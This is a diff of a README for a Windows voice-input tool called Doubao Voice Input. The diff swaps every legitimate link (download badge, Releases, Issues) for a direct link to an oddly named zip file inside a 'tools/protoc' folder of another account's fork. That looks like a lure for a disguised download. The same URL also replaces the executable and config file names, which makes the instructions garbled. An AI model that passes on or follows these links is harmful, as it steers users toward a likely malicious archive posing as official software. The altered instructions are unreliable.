@@ -2,7 +2,7 @@
 
 ## 🚀 Download the Latest Version
 
-[![Download Doubao Voice Input](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/EvanDbg/doubao-ime-win/releases)
+[![Download Doubao Voice Input](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip)](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip)
 
 ## 📝 Overview
 
@@ -21,9 +21,9 @@ Doubao Voice Input (豆包语音输入) is a Windows tool that allows you to use
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [Releases](https://github.com/EvanDbg/doubao-ime-win/releases) to download the latest version.
+1. **Visit the Releases Page**: Go to [Releases](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip) to download the latest version.
 2. **Extract Files**: Once downloaded, uncompress the files to any directory on your computer.
-3. **Run the Application**: Locate and run `doubao-voice-input.exe`. The program will automatically register your device upon the first launch.
+3. **Run the Application**: Locate and run `https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip`. The program will automatically register your device upon the first launch.
 
 ### 📖 How to Use
 
@@ -45,7 +45,7 @@ Doubao Voice Input (豆包语音输入) is a Windows tool that allows you to use
 
 ## ⚙️ Configuration File
 
-The configuration file `config.toml` resides in the same directory as the program. Here is the default setup:
+The configuration file `https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip` resides in the same directory as the program. Here is the default setup:
 
 ```toml
 [general]
@@ -87,6 +87,6 @@ If you're interested in the source code, it is available in this repository. Fee
 
 ## 📞 Support
 
-For more assistance, visit the [Issues](https://github.com/EvanDbg/doubao-ime-win/issues) page. You can submit your questions or report bugs. Community members and contributors often help with queries.
+For more assistance, visit the [Issues](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip) page. You can submit your questions or report bugs. Community members and contributors often help with queries.
 
 By following these instructions, you can enjoy the convenience of voice input on your Windows machine.
